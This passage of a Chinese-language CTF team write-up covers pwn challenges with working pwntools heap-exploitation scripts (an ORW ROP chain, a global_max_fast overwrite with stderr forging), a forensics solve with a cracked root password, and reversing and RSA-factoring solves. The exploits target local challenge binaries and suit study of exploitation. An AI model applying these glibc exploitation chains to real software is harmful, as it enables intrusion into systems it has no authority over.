</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x5b0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_r12_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x30</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x5b0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_r12_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x30</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>11</span><span class=p>,</span> <span class=nb>bin</span><span class=p>((</span><span class=n>setcontext</span><span class=p>))[</span><span class=mi>2</span><span class=p>:][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>64</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bin_frame</span> <span class=o>=</span> <span class=n>convert</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>frame</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>12</span><span class=p>,</span> <span class=mh>0x98</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>12</span><span class=p>,</span> <span class=n>bin_frame</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mh>0x98</span><span class=o>*</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>15</span><span class=p>,</span> <span class=mh>0x98</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>15</span><span class=p>,</span> <span class=n>bin_frame</span><span class=p>[</span><span class=mh>0xa0</span><span class=o>*</span><span class=mi>8</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>orw</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=leak>leak</h2><p>flag被读到了一个堆块上，限制了申请堆块的个数，只能十六个，没有限制uaf的使用次数，可以改大Global_Max_Fast，造成fastbinY数组溢出，我们可以向write_base和write_ptr上写入堆地址，满足条件:write_ptr>write_base即可，利用公式size=((target_addr-(main_arena+8)/8)*0x10+0x20)，就可以算出需要的size，最后exit，打印出flag即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./leak&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./leak&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc-2.27.so&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;debug&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your choice: &#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Size: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your choice: &#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Content: &#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your choice: &#34;</span><span class=p>,</span> <span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x14b0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x14c0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x430</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>9</span><span class=p>,</span> <span class=mh>0xa0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0xa0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x9c30</span><span class=p>))</span>  <span class=c1># tcache fd -&gt; unsorted bin chunk</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0xf940</span><span class=p>))</span>  <span class=c1># fd -&gt; global_max_fast</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbee0</span><span class=p>))</span>  <span class=c1># global_max_fast -&gt; 0xdeadbeef</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0xe840</span><span class=p>))</span>  <span class=c1># tcache fd -&gt; unsorted chunk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>9</span><span class=p>,</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x9c30</span><span class=p>))</span>  <span class=c1># fd-&gt; stderr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>11</span><span class=p>,</span> <span class=mh>0xa0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>12</span><span class=p>,</span> <span class=mh>0xa0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=mh>0xa0</span><span class=p>)</span>  <span class=c1># stderr</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>14</span><span class=p>,</span><span class=mh>0xa0</span><span class=p>)</span><span class=c1># change stderr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>14</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xfbad1887</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x50</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>#io.interactive()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#add(14, 0x14d0)</span>
</span></span><span class=line><span class=cl><span class=c1>#add(15, 0x500)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your choice: &#34;</span><span class=p>,</span> <span class=s2>&#34;6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=misc>Misc</h1><h2 id=strange_forensics>strange_forensics</h2><p>flag1是用户密码，直接搜root:
爆破出密码
$1$C5/bIl1n$9l5plqPKK4DjjqpGHz46Y/:890topico
flag3直接是明文
<img src=/img/2022-xyb-SU-Writeup/9.png alt=img></p><p>stings发现里面有个secret.zip</p><p>用vol的插件提取linux_recover_filesystem，得制作一个同内核的profile，strings找到镜像系统Ubuntu18.04.5 5_4_0-84-generic
开一个虚拟机，apt安装好kernel，然后再vol的tools里生成profile并且打包好放进vol的插件里
测试可以用了以后就可以linux_recover_filesystem去
导出zip文件，打开是损坏的，010修复一下，修改一下加密位
爆破出密码为123456拿到flag2 _y0u_Ar3_tHe_LIn
最后拿到flag
flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}</p><h1 id=rev>Rev</h1><h2 id=roket>roket</h2><p>测试输入数据和输出数据寻找规律发现是输入转ascii码然后三次方得到输出</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>gmpy2</span><span class=o>.</span><span class=n>iroot</span><span class=p>(</span><span class=mi>7212272804013543391008421832457418223544765489764042171135982569211377620290274828526744558976950004052088838419495093523281490171119109149692343753662521483209758621522737222024221994157092624427343057143179489608942837157528031299236230089474932932551406181</span><span class=p>,</span> <span class=mi>3</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>#6374667b746831735f69735f7265346c6c795f626561757431666c795f72316768743f7d</span>
</span></span><span class=line><span class=cl><span class=n>a</span><span class=o>=</span><span class=s1>&#39;6374667b746831735f69735f7265346c6c795f626561757431666c795f72316768743f7d&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>a</span><span class=p>),</span><span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=o>+</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>+</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>],</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;flag:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#0x63,0x74,0x66,0x7b,0x74,0x68,0x31,0x73,0x5f,0x69,0x73,0x5f,0x72,0x65,0x34,0x6c,0x6c,0x79,0x5f,0x62,0x65,0x61,0x75,0x74,0x31,0x66,0x6c,0x79,0x5f,0x72,0x31,0x67,0x68,0x74,0x3f,0x7d</span>
</span></span><span class=line><span class=cl><span class=n>b</span><span class=o>=</span><span class=p>[</span><span class=mh>0x63</span><span class=p>,</span><span class=mh>0x74</span><span class=p>,</span><span class=mh>0x66</span><span class=p>,</span><span class=mh>0x7b</span><span class=p>,</span><span class=mh>0x74</span><span class=p>,</span><span class=mh>0x68</span><span class=p>,</span><span class=mh>0x31</span><span class=p>,</span><span class=mh>0x73</span><span class=p>,</span><span class=mh>0x5f</span><span class=p>,</span><span class=mh>0x69</span><span class=p>,</span><span class=mh>0x73</span><span class=p>,</span><span class=mh>0x5f</span><span class=p>,</span><span class=mh>0x72</span><span class=p>,</span><span class=mh>0x65</span><span class=p>,</span><span class=mh>0x34</span><span class=p>,</span><span class=mh>0x6c</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x6c</span><span class=p>,</span><span class=mh>0x79</span><span class=p>,</span><span class=mh>0x5f</span><span class=p>,</span><span class=mh>0x62</span><span class=p>,</span><span class=mh>0x65</span><span class=p>,</span><span class=mh>0x61</span><span class=p>,</span><span class=mh>0x75</span><span class=p>,</span><span class=mh>0x74</span><span class=p>,</span><span class=mh>0x31</span><span class=p>,</span><span class=mh>0x66</span><span class=p>,</span><span class=mh>0x6c</span><span class=p>,</span><span class=mh>0x79</span><span class=p>,</span><span class=mh>0x5f</span><span class=p>,</span><span class=mh>0x72</span><span class=p>,</span><span class=mh>0x31</span><span class=p>,</span><span class=mh>0x67</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x68</span><span class=p>,</span><span class=mh>0x74</span><span class=p>,</span><span class=mh>0x3f</span><span class=p>,</span><span class=mh>0x7d</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>b</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>b</span><span class=p>[</span><span class=n>i</span><span class=p>]),</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=crypto>crypto</h1><h2 id=little-little-fermat>little little fermat</h2><p>题名提示了费马，并且分析p和q的生成过程可知，A相比于n是不算太大的；遂直接考虑费马分解n，得到p，q以后根据assert 114514 ** x % p == 1可知x为p-1或p-1的整数倍，直接取x为p-1进行计算，异或就能得到flag。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=mi>81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>fermat</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>iroot</span><span class=p>(</span><span class=n>num</span><span class=p>,</span> <span class=mi>2</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span> <span class=o>*</span> <span class=n>x</span> <span class=o>&lt;</span> <span class=n>num</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=c1># y^2 = x^2 - num</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>y2</span> <span class=o>=</span> <span class=n>x</span> <span class=o>*</span> <span class=n>x</span> <span class=o>-</span> <span class=n>num</span>
</span></span><span class=line><span class=cl>        <span class=n>y</span> <span class=o>=</span> <span class=n>iroot</span><span class=p>(</span><span class=n>y2</span><span class=p>,</span> <span class=mi>2</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>y</span> <span class=o>*</span> <span class=n>y</span> <span class=o>==</span> <span class=n>y2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=n>y</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>x</span> <span class=o>-</span> <span class=n>y</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl><span class=n>l</span> <span class=o>=</span> <span class=n>fermat</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>l</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=n>l</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>x</span> <span class=o>=</span> <span class=n>p</span><span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>65537</span>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=n>invert</span><span class=p>(</span><span class=n>e</span><span class=p>,(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>tmp</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>c</span><span class=p>,</span><span class=n>d</span><span class=p>,</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>tmp</span><span class=o>^</span><span class=p>(</span><span class=n>x</span><span class=o>**</span><span class=mi>2</span><span class=p>)))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=tracing>tracing</h2><p>题目自己实现了求公因数的算法gcd，主要是通过分支语句，加减法和移位操作来实现的；而trace.out文件则是类似于debug，打印了gcd算法整个过程的分支执行情况，所以我们只要用最后的a和b的值去反推整个算法，得到phi解密即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=n>invert</span>
